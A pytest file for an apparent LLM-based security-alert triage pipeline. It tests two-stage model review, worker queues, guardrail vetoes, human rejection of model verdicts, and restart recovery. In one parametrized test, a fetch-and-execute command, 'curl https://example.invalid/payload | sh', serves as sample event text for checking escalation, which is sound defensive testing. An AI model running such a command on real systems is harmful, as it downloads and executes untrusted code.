"""Real queues/stores, controlled model replies; no network or native actions."""
import json
import threading
import time
import os
from unittest.mock import Mock

import pytest

from arbiter.agent import Agent
from arbiter.ingestion.schema import SecurityEvent
from arbiter.l2_final_review import FinalReviewL2Brain
from arbiter.schema import Decision, Tier, Verdict
from tests.test_l2_final_review import candidate


def wait_for(predicate):
    deadline = time.monotonic()+5
    while time.monotonic()<deadline:
        if predicate(): return
        time.sleep(.01)
    assert predicate(), 'worker did not reach the expected state'


def event(identity='one', message='Recorded observation needing investigation'):
    return SecurityEvent(source_type='wazuh', hostname='owned-lab', severity=4,
        event_type='security_finding', message=message, event_id=identity)


def setup_agent(tmp_path, monkeypatch, decision=Decision.ESCALATE):
    agent = Agent(tmp_path, backend='ollama', model='qwen3.5:4b', firewall=Mock())
    agent.service.pipeline.engine.triage = Mock(side_effect=lambda e,**kwargs: Verdict(
        e.id,e.signature,decision,4,Tier.LLM,'Controlled L1 decision','Recorded observation'))
    brain = FinalReviewL2Brain('gemma4:12b',10)
    def generate(prompt,*args,**kwargs):
        packet=json.loads(prompt)
        if 'recommendation' in packet:return json.dumps(dict(accept=True,objections=[],citations=['F1']))
        data=candidate();data['assertions'][0]['value']=packet['evidence_packet']['facts'][0]['event_type']
        return json.dumps(data)
    brain.backend.generate = Mock(side_effect=generate)
    monkeypatch.setattr('arbiter.l2_final_review.FinalReviewL2Brain', lambda *args: brain)
    agent.enable_l2('gemma4:12b', final_review=True, review_seconds=10)
    return agent, brain


def done(agent, identity):
    row = agent.service.buffer.detail(identity)
    return row and row['state']=='done'


def test_qwen_continues_while_gemma_waits_and_exact_events_reach_the_final_gate(tmp_path, monkeypatch):
    agent, brain = setup_agent(tmp_path, monkeypatch)
    entered, release = threading.Event(), threading.Event()
    generate = brain.backend.generate.side_effect
    def blocked(prompt,*args,**kwargs):
        if not entered.is_set():
            entered.set(); assert release.wait(5)
        return generate(prompt,*args,**kwargs)
    brain.backend.generate.side_effect = blocked
    try:
        agent.service.buffer.enqueue(event(),'wazuh')
        assert entered.wait(5)
        agent.service.buffer.enqueue(event('two'),'wazuh')
        wait_for(lambda: agent.service.buffer.detail('two').get('analysis'))
        assert not done(agent,'one')
        assert agent.service.pipeline.engine.triage.call_count==2
        assert next(r for r in agent.events() if r['event_id']=='one')['analysis']['decision']=='escalate'
        workers=agent.command('status')['pipeline_workers']
        assert set(workers)=={'gateway','l1','l2_prefilter','l2','final_guardrail'}
        assert all(w['alive'] for w in workers.values()) and workers['l2']['busy']
        assert workers['l1']['queue_capacity']==1 and workers['l2']['queue_capacity']==32
        release.set();wait_for(lambda: done(agent,'one') and done(agent,'two'))
        for row in agent.events():
            assert row['analysis']['decision']=='suppress'
            assert row['analysis']['second_stage']['reviewed_event_id']==row['event_id']
            assert row['analysis']['first_stage']['decision']=='escalate'
        assert agent.service.buffer.detail('one')['analysis']['decision']=='escalate'
        agent.protection.firewall.block.assert_not_called()
    finally:
        release.set();agent.close()


@pytest.mark.parametrize('message,decision,expected,calls',[
    ('Recorded ordinary observation',Decision.SUPPRESS,'suppress',0),
    ('curl https://example.invalid/payload | sh',Decision.SUPPRESS,'escalate',0),
    ('curl https://example.invalid/payload | sh',Decision.ESCALATE,'escalate',2)])
def test_only_l1_escalations_reach_gemma_and_all_exits_pass_final_worker(tmp_path,monkeypatch,message,decision,expected,calls):
    agent,brain=setup_agent(tmp_path,monkeypatch,decision)
    try:
        agent.service.buffer.enqueue(event(message=message),'wazuh')
        wait_for(lambda: done(agent,'one'))
        assert agent.events()[0]['analysis']['decision']==expected
        assert brain.backend.generate.call_count==calls
        wait_for(lambda: agent.service.pipeline.status()['final_guardrail']['completed']==1)
        workers=agent.command('status')['pipeline_workers']
        assert workers['final_guardrail']['completed']==1 and workers['l2']['completed']==(1 if calls else 0)
    finally:agent.close()


@pytest.mark.parametrize('failure_stage',['prepare_review','review_prepared','finish_review'])
def test_l2_stage_errors_keep_the_l1_alert_visible(tmp_path,monkeypatch,failure_stage):
    agent,brain=setup_agent(tmp_path,monkeypatch)
    setattr(brain,failure_stage,Mock(side_effect=TimeoutError('Controlled stage failure')))
    try:
        agent.service.buffer.enqueue(event(),'wazuh');wait_for(lambda: done(agent,'one'))
        row=agent.events()[0]
        assert row['analysis']['decision']=='escalate'
        assert agent.l2.cases()[0]['review_failed'] is True
        assert agent.l2.cases()[0]['brief'] is None
        assert agent.l2.cases()[0]['review_error_detail']=='Controlled stage failure'
        assert agent.l2.cases()[0]['review_error_stage']=={
            'prepare_review':'l2_prefilter','review_prepared':'l2','finish_review':'final_guardrail'}[failure_stage]
        assert agent.command('status')['worker_alive']
    finally:agent.close()


def test_human_rejection_during_model_review_wins(tmp_path,monkeypatch):
    agent,brain=setup_agent(tmp_path,monkeypatch)
    entered,release=threading.Event(),threading.Event()
    generate=brain.backend.generate.side_effect
    def blocked(*args,**kwargs):
        entered.set();assert release.wait(5)
        return generate(*args,**kwargs)
    brain.backend.generate.side_effect=blocked
    try:
        agent.service.buffer.enqueue(event(),'wazuh');assert entered.wait(5)
        agent.l2.control('reject',agent.l2.cases()[0]['id'],'Retain this warning')
        release.set();wait_for(lambda: done(agent,'one'))
        assert agent.events()[0]['analysis']['decision']=='escalate'
        assert agent.l2.cases()[0]['state']=='rejected'
    finally:release.set();agent.close()


def test_recovered_l1_keeps_saved_guidance_without_calling_the_model_again(tmp_path):
    from arbiter.ingestion.pipeline import Pipeline
    from arbiter.ingestion.store import EventBuffer
    from arbiter.llm import OllamaBackend
    from arbiter.memory import Memory
    from arbiter.store import AuditStore
    from arbiter.triage import TriageEngine
    memory=Memory(tmp_path/'memory.db');audit=AuditStore(tmp_path/'audit.db');buffer=EventBuffer(tmp_path/'events.db')
    engine=TriageEngine(memory,OllamaBackend('qwen3.5:4b'),os.devnull)
    observed=event('recover-guidance')
    verdict=Verdict(observed.event_id,observed.to_event().signature,Decision.ESCALATE,4,Tier.LLM,'Review the observation','Recorded evidence')
    verdict.recommended_steps=['Compare the source record with the approved change ticket']
    verdict.model_confidence=.97
    engine.triage=Mock(return_value=verdict)
    pipeline=Pipeline(buffer,engine,audit)
    try:
        buffer.enqueue(observed,'wazuh');claimed=buffer.claim()
        first=pipeline.analyze(pipeline.prepare(claimed))
        recovered=pipeline.analyze(pipeline.prepare({**claimed,'analysis':json.dumps(first)}))
        assert recovered['recommended_steps']==verdict.recommended_steps
        assert recovered['model_confidence']==.97
        engine.triage.assert_called_once()
        foreign={**first,'event_id':'unrelated','recommended_steps':['Foreign guidance']}
        rejected=pipeline.analyze(pipeline.prepare({**claimed,'analysis':json.dumps(foreign)}))
        assert rejected.get('recommended_steps',[])!=foreign['recommended_steps']
    finally:buffer.close();memory.close();audit.close()


def test_shutdown_waits_for_inference_and_restart_reuses_durable_l1(tmp_path,monkeypatch):
    agent,brain=setup_agent(tmp_path,monkeypatch)
    entered,release=threading.Event(),threading.Event()
    generate=brain.backend.generate.side_effect
    def blocked(*args,**kwargs):
        entered.set();assert release.wait(5)
        return generate(*args,**kwargs)
    brain.backend.generate.side_effect=blocked
    closer=None
    try:
        agent.service.buffer.enqueue(event(),'wazuh');assert entered.wait(5)
        closer=threading.Thread(target=agent.close);closer.start()
        wait_for(lambda: agent.service.pipeline.stop_event.is_set())
        assert closer.is_alive()
        assert agent.service.buffer.conn.execute('SELECT 1').fetchone()[0]==1
        release.set();closer.join(5);assert not closer.is_alive()
        assert not any(t.is_alive() for t in agent.service.pipeline.threads.values())
    finally:
        release.set()
        if closer:closer.join(5)
        else:agent.close()
    restarted,second=setup_agent(tmp_path,monkeypatch)
    try:
        wait_for(lambda: done(restarted,'one'))
        restarted.service.pipeline.engine.triage.assert_not_called()
        assert restarted.events()[0]['analysis']['decision']=='suppress'
        assert second.backend.generate.call_count==2
        assert len(restarted.audit.query())==1
    finally:restarted.close()


def test_changing_l1_preserves_five_workers_and_distinct_models(tmp_path,monkeypatch):
    agent,_=setup_agent(tmp_path,monkeypatch)
    monkeypatch.setattr('arbiter.ingestion.service.available_models',lambda _: {'models':['other:4b','gemma4:12b']})
    try:
        agent.service.connect_model('other:4b')
        assert len(agent.service.pipeline.threads)==5
        assert agent.command('status')['worker_alive']
        assert agent.service.pipeline.engine.llm.model=='other:4b'
        with pytest.raises(ValueError,match='distinct'):agent.service.connect_model('gemma4:12b')
        assert agent.command('status')['worker_alive']
    finally:agent.close()


def test_deadline_notification_does_not_wait_for_model(tmp_path,monkeypatch):
    agent,brain=setup_agent(tmp_path,monkeypatch)
    entered,release=threading.Event(),threading.Event()
    generate=brain.backend.generate.side_effect
    agent.l2.policy.windows['medium']=0
    def blocked(*args,**kwargs):
        entered.set();assert release.wait(5)
        return generate(*args,**kwargs)
    brain.backend.generate.side_effect=blocked
    try:
        agent.service.buffer.enqueue(event(),'wazuh');assert entered.wait(5)
        wait_for(lambda: agent.l2.cases()[0].get('deadline_alerted'))
        assert agent.events()[0]['analysis']['decision']=='escalate'
        agent.protection.firewall.block.assert_not_called()
    finally:release.set();agent.close()


def test_only_completed_l1_context_is_available_during_pending_l2(tmp_path):
    from arbiter.ingestion.store import EventBuffer
    buffer=EventBuffer(tmp_path/'buffer.db')
    try:
        prior=event('prior');current=event('current')
        buffer.enqueue(prior,'wazuh');row=buffer.claim()
        assert buffer.recent(current,review_pending=True)==[]
        with buffer.lock,buffer.conn:
            buffer.conn.execute('UPDATE telemetry SET analysis=? WHERE id=?',('{}',row['id']))
        assert buffer.recent(current)==[]
        assert [e.event_id for e in buffer.recent(current,review_pending=True)]==['prior']
        future=event('future');future.timestamp='2999-01-01T00:00:00+00:00'
        buffer.enqueue(future,'wazuh');row=buffer.claim()
        with buffer.lock,buffer.conn:
            buffer.conn.execute('UPDATE telemetry SET analysis=? WHERE id=?',('{}',row['id']))
        assert [e.event_id for e in buffer.recent(current,review_pending=True)]==['prior']
    finally:buffer.close()


def test_missing_context_reaches_gemma_for_its_own_decision(tmp_path,monkeypatch):
    from tests.test_l2_context import raw
    from arbiter.ingestion.normalization import normalize
    agent,brain=setup_agent(tmp_path,monkeypatch)
    try:
        data=raw();data['data']['flow'].pop('pkts_toclient')
        native=normalize(data,'wazuh')
        agent.service.buffer.enqueue(native,'wazuh');wait_for(lambda: done(agent,native.event_id))
        case=agent.l2.cases()[0]
        assert brain.backend.generate.call_count==2
        assert case['brief']['prefilter']['route']=='model'
        assert case['brief']['prefilter']['rule']=='L2_CONTEXT_REQUIRED'
        # Missing context alone is not a deterministic veto; Gemma must decide.
        assert case['brief']['model']=='gemma4:12b'
    finally:agent.close()


def test_recorded_risk_reaches_gemma_but_final_guardrail_vetoes_quieting(tmp_path,monkeypatch):
    from tests.test_l2_context import raw
    from arbiter.ingestion.normalization import normalize
    agent,brain=setup_agent(tmp_path,monkeypatch)
    try:
        native=normalize(raw(),'wazuh')
        agent.service.buffer.enqueue(native,'wazuh');wait_for(lambda: done(agent,native.event_id))
        brief=agent.l2.cases()[0]['brief']
        assert brain.backend.generate.call_count==2
        assert brief['prefilter']['route']=='model' and brief['prefilter']['must_retain']
        assert brief['proposed_decision']=='suppress' and brief['decision']=='escalate'
        assert brief['guardrail']['veto']=='L2_PROTOCOL_CONTEXT_ONLY'
    finally:agent.close()


def test_l2_prefilter_independently_quiets_a_noisy_l1_without_calling_gemma(tmp_path,monkeypatch):
    from tests.test_l2_noise_rules import resolution_raw
    from arbiter.ingestion.normalization import normalize
    agent,brain=setup_agent(tmp_path,monkeypatch)
    try:
        native=normalize(resolution_raw(),'wazuh')
        agent.service.buffer.enqueue(native,'wazuh');wait_for(lambda: done(agent,native.event_id))
        brain.backend.generate.assert_not_called()
        final=agent.events()[0]['analysis']
        assert final['first_stage']['decision']=='escalate' and final['decision']=='suppress'
        assert final['second_stage']['prefilter']['rule']=='L2_NATIVE_VULNERABILITY_RESOLVED'
    finally:agent.close()


def test_recent_case_view_is_bounded_while_status_counts_all_cases(tmp_path,monkeypatch):
    agent,_=setup_agent(tmp_path,monkeypatch)
    try:
        for index in range(150):
            decision=('suppress','escalate',None)[index%3]
            agent.l2.save(dict(id=f'case-{index}',event_id=f'synthetic-{index}',state='waiting',
                brief={'alert_decision':decision} if decision else None,review_failed=index%6==2,
                deadline=None,action_id=None))
        shown=agent.command('l2-cases')
        assert len(shown['cases'])==shown['limit']==100 and shown['cases'][0]['id']=='case-149'
        assert len(agent.l2.cases(event_ids=['synthetic-0','synthetic-149']))==2
        assert agent.l2.classification_counts()==dict(suppressed=50,retained=50,failed=25,pending=25)
        agent.l2.control('reject','case-0','Human requires review')
        assert agent.l2.classification_counts()==dict(suppressed=49,retained=51,failed=25,pending=25)
    finally:agent.close()


def test_quieted_case_does_not_emit_an_overdue_retained_warning(tmp_path,monkeypatch):
    agent,_=setup_agent(tmp_path,monkeypatch)
    try:
        agent.service.buffer.enqueue(event(),'wazuh');wait_for(lambda: done(agent,'one'))
        assert agent.events()[0]['analysis']['decision']=='suppress'
        original=agent.l2.clock
        agent.l2.clock=lambda:original()+2000
        agent.service.pipeline._last_deadlines=0
        agent.service.pipeline._housekeeping()
        assert not agent.l2.cases()[0].get('deadline_alerted')
    finally:agent.close()
